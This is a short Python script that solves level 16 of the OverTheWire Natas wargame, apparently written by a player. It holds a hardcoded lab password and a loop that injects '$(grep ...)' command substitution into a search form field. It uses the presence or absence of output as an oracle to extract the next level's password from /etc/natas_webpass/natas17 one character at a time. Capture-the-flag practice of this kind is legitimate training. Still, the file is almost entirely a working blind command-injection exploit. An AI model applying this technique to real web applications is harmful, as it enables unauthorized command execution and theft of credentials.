#!/usr/bin/env python

import requests
import re
from string import *

characters = lowercase + uppercase + digits	
	
username='natas16'
password='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/?debug=true'
session = requests.session()

seen_pass = list()


while (len(seen_pass)<32):
	for ch in characters:
		print "Trying password: " + "".join(seen_pass) + ch
		response = session.post(url, auth=(username, password), data = { 'needle': 'hello$(grep ^' + "".join(seen_pass) + ch +  ' /etc/natas_webpass/natas17)'})
		content = response.text
		
		if '<pre>\n</pre>' in content:
			seen_pass.append(ch)
			break

final_pass = "".join(seen_pass)
print "Password is: ", final_pass

# Here the ($grep <value> <filepath>) helped us to guess the password.
# Because if the value of this turned out to be true it'd change the string to be searched in dicionary file. So, we first selected a string that was present in the file. And everything when it did not returned a result, it made it clear that the passed value was a part of the password as it was detected in the password file which changed the value to be searched in dicitonary file resulting in no output.